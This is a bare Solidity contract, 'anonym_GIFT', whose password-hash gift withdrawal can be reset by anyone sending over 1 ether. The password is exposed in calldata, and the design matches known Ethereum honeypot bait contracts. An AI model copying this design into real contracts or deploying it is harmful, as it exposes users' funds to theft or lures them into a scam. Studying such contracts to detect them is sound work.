pragma solidity ^0.4.19;

contract anonym_GIFT
{
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == keccak256(pass) &amp;&amp; now&gt;giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function GetGift()
    public
    payable
    {
        if(msg.sender==reciver &amp;&amp; now&gt;giftTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    bytes32 hashPass;
    
    bool closed = false;
    
    address sender;
    
    address reciver;
 
    uint giftTime;
 
    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&amp;&amp;(msg.value &gt; 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
            giftTime = now;
        }
    }
    
    function SetGiftTime(uint date)
    public
    {
        if(msg.sender==sender)
        {
            giftTime = date;
        }
    }
    
    function SetReciver(address _reciver)
    public
    {
        if(msg.sender==sender)
        {
            reciver = _reciver;
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&amp;&amp;msg.sender==sender)
        {
           closed=true;
        }
    }
    
    function() public payable{}
    
}